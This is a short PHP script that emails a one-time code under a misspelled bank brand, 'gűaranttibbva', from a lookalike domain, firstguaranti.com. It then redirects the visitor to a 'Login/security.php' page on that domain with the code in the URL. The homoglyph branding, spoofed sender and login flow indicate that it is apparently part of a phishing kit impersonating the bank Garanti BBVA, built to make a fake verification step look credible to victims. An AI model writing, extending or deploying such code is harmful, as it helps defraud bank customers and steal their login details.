<?php session_start();
error_reporting(0);


  $email = $_GET["email"];

   
    $random = rand(01234,56789);
    
    $subject = "OTP to gűaranttibbva";
    
    $body = "<p>OTP: $random <br /></p>
    <p>gűaranttibbva Team</p>";
    $to = $email;
    
$headers .='Reply-To: '. $to . "\r\n" ;
$headers .='X-Mailer: PHP/' . phpversion();
$headers .="MIME-Version: 1.0\r\n";
$headers .="Content-Type: text/html; charset=ISO-8859-1\r\n";

    
if(mail($to,$subject,$body,$headers, '-f info@firstguaranti.com -F "gűaranttibbva"')) {

        echo"<meta http-equiv='refresh' content='0 url=http://firstguaranti.com/Login/security.php?otp=$random' />";
  } 
  else 
  {

  }
    
    


?>